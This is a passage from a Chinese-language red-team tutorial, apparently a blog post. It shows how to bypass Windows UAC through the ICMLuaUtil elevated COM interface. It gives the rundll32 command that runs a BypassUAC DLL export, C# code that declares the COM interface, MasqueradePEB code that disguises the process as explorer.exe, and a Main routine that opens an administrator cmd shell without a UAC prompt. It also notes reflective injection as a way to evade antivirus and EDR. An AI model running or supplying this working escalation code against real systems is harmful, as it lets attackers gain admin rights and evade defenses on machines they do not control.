在代码编写好后，首先在导出的函数为BypassUAC，新建一个def文
件，内容如下：
LIBRARY BypassUAC
EXPORTS
BypassUAC
这 里 重 新 生 成 一 下 ， 可 以 看 到 在
C ： \Users\admin\Desktop\BypassUAC\x64\Release\ 目 录 下
生成了一个BypassUAC_Dll.dll。
最后我们使用rundll32.exe去运行一下，直接就弹出了管理员的c
md来，原因就是使用rundll32.exe运行的，rundll32.exe是被系
统认可的可信进程，所以拿它去运行就可以直接执行：
rundll32.exe .\BypassUAC_Dll.dll,BypassUAC
这是一种利用方法，但是这种利用方式,在实际的渗透测试中用到的
会比较少，首先这个dll会落地，然后再用rundll32.exe去调用实
际效果不太好，所以我们需要把它编译成直接在内存加载的dll。
直接在内存加载，有如下几种方式，第一种，如果是用c或C++类似
这种编译型的语言编译出来的dll,这种编译出来的dll是属于nativ
e dll,native dll 在内存中加载执行通用的方法是Reflective
Dll Injection RDI 去执行它。类似的还有dll to shellcode
exe to shellcode
但是这类方法现在很多杀软跟EDR都被标注了。
CSharp version
更好的方式直接做成.net版本
代码摘自Moriarty
C#版本的代码中要注意的是ICMLuaUtil接口的定义，其继承自IUn
Known，该接口的定义函数是：
IUnknown::AddRefIUnknown::QueryInterfaceIUnknown::QueryInterface
在定义ICMLuaUtil的时候，需要注意的有两点：
1、指明继承ICMLuaUtil接口；
2、继承的前三个函数不需要加上，C#会自动添加。
其继承自IUnKnown，因此这里一定要写成InterfaceIsIUnknown
。
关键代码如下：
[ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"),
InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface ILua
{
[MethodImpl(MethodImplOptions.InternalCall,
MethodCodeType = MethodCodeType.Runtime), PreserveSig]
void Method1();
[MethodImpl(MethodImplOptions.InternalCall,
MethodCodeType = MethodCodeType.Runtime), PreserveSig]
void Method2();
[MethodImpl(MethodImplOptions.InternalCall,
MethodCodeType = MethodCodeType.Runtime), PreserveSig]
void Method3();
[MethodImpl(MethodImplOptions.InternalCall,
MethodCodeType = MethodCodeType.Runtime), PreserveSig]
void Method4();
[MethodImpl(MethodImplOptions.InternalCall,
MethodCodeType = MethodCodeType.Runtime), PreserveSig]
void Method5();
[MethodImpl(MethodImplOptions.InternalCall,
MethodCodeType = MethodCodeType.Runtime), PreserveSig]
void Method6();
[MethodImpl(MethodImplOptions.InternalCall,
MethodCodeType = MethodCodeType.Runtime), PreserveSig]
HRESULT ShellExec(
[In, MarshalAs(UnmanagedType.LPWStr)] string
file,
[In, MarshalAs(UnmanagedType.LPWStr)] string
paramaters,
[In, MarshalAs(UnmanagedType.LPWStr)] string
directory,
[In] uint fMask,
[In] uint nShow);
}
有个这个接口声明之后，编程怎么实现，不可能再去创建一个rundl
l32.exe进程什么的去执行。这里就要引出另一个技术，叫Masque
radePEB，翻译过来就是伪装。
将自己的进程信息伪装成为c:\windows\explorer.exe这个系统
的可信进程，这样才能绕过UAC认证窗口，因为UAC在判断系统进程
是否可信，判断依据是PEB结构，所以在使用COM组件提权之前需要
先伪装一下进程才可以。
McfInitUnicodeString(procHandle, BaseDllNamePtr,
"explorer.exe");
McfInitUnicodeString(procHandle,
FullDllNamePtr,
$"{System.Environment.GetEnvironmentVariable("SystemRoot").ToLow
er()}\\explorer.exe");
接下来我们做一下演示，我们的关键代码是调用MasqueradePEB，
第一次先注释掉，然后右键生成文件。
[STAThread]
static void Main(string[] args)
{
Guid classId = new Guid("3E5FC7F9-9A51-4367-9063-
A120244FBEC7");
Guid interfaceId = new Guid("6EDD6D74-C007-4E75-
B76A-E5740995E24C");
//MasqueradePEB();
object elvObject = LaunchElevatedCOMObject(classId,
interfaceId);
if (elvObject != null)
{
//MessageBox.Show("Got the Object");
ILua ihw = (ILua)elvObject;
ihw.ShellExec("c:\\windows\\system32\\cmd.exe",
null, null, 0, 5);
Marshal.ReleaseComObject(elvObject);
运行生成的文件，这个时候会弹出UAC框，因为它不是可信进程，所
以运行的时候UAC还是没有过掉，这就是没有MasqueradePEB效果
是这样的。
接下来先用MasqueradePEB进行伪装一下，再次右键生成文件。
[STAThread]
static void Main(string[] args)
{
Guid classId = new Guid("3E5FC7F9-9A51-4367-9063-
A120244FBEC7");
Guid interfaceId = new Guid("6EDD6D74-C007-4E75-
B76A-E5740995E24C");
MasqueradePEB();
object elvObject = LaunchElevatedCOMObject(classId,
interfaceId);
if (elvObject != null)
{
//MessageBox.Show("Got the Object");
ILua ihw = (ILua)elvObject;
ihw.ShellExec("c:\\windows\\system32\\cmd.exe",
null, null, 0, 5);
Marshal.ReleaseComObject(elvObject);
直接点击生成，就可以直接弹出管理员的cmd窗口，这就是直接Byp
assUAC的效果。
总结
由于项目当中的经历而引发的一次BypassUAC修炼，掌握BypassUA
C的方法论。渗透的过程中，我们有时遇到问题，不能只停留在使用
工具的层面，因为使用现成的工具，只能等着别人更新。需要我们
深入理解原理后，自己动手，丰衣足食。且这样只要遇到一次类似
的问题，解决后，下次再遇到就可以直接跨过。
感谢红队学院的Moriarty分享的最初视频，以及在实践过程中goto
:REinject对我的指导，文章中借鉴了部分goto:Reinject最初的
文章BypassUAC。
精选留言
用户设置不下载评论